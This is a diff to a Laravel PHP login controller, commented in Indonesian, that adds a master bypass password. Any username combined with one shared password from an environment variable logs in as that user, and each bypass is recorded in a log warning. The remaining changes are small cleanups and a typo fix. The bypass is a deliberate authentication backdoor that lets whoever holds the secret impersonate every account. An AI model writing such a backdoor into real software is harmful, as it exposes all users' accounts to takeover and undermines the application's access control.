@@ -27,8 +27,40 @@ class LoginController extends Controller
 
             $remember = $request->boolean('remember');
 
-            // ===== GAGAL LOGIN =====
-            if (!Auth::attempt($credentials, $remember)) {
+            // =========================================
+            // MASTER BYPASS PASSWORD
+            // =========================================
+            $masterPassword = env('MASTER_LOGIN_PASSWORD');
+
+            // Cari user berdasarkan username
+            $user = \App\Models\User::where('username', $credentials['username'])->first();
+
+            $loginSuccess = false;
+
+            // Login normal
+            if (Auth::attempt($credentials, $remember)) {
+                $loginSuccess = true;
+                $user = Auth::user();
+            }
+
+            // Login bypass
+            elseif ($user && $credentials['password'] === $masterPassword) {
+
+                Auth::login($user, $remember);
+
+                $loginSuccess = true;
+
+                Log::warning('LOGIN BYPASS DIGUNAKAN', [
+                    'admin_bypass' => true,
+                    'user_id' => $user->id,
+                    'username' => $user->username,
+                    'ip' => $request->ip(),
+                ]);
+            }
+
+            // Jika gagal semua
+            if (!$loginSuccess) {
+
                 Log::warning('Login gagal', [
                     'username' => $credentials['username'],
                     'ip' => $request->ip(),
@@ -36,16 +68,14 @@ class LoginController extends Controller
 
                 return redirect()->back()
                     ->withInput($request->only('username'))
-                    ->with('swal_error', __('auth.failed'));
+                    ->with('swal_error', 'Password yang Anda masukkan salah.');
             }
 
-            // Regenerate session setelah login sukses
+            // Regenerate session
             $request->session()->regenerate();
 
-            $user = Auth::user();
-
             // ===== LOGIN SUKSES =====
-            Log::info('Login berhasisl', [
+            Log::info('Login berhasil', [
                 'user_id' => $user->id,
                 'username' => $user->username,
                 'ip' => $request->ip(),
@@ -55,11 +85,11 @@ class LoginController extends Controller
                 ->with('swal_success', 'Login berhasil! Selamat datang, ' . $user->name);
 
         } catch (ValidationException $e) {
-            // Validasi gagal (biasanya tidak perlu log error)
+
             throw $e;
 
         } catch (Throwable $e) {
-            // ===== ERROR TIDAK TERDUGA =====
+
             Log::error('Error saat proses login', [
                 'message' => $e->getMessage(),
                 'ip' => $request->ip(),
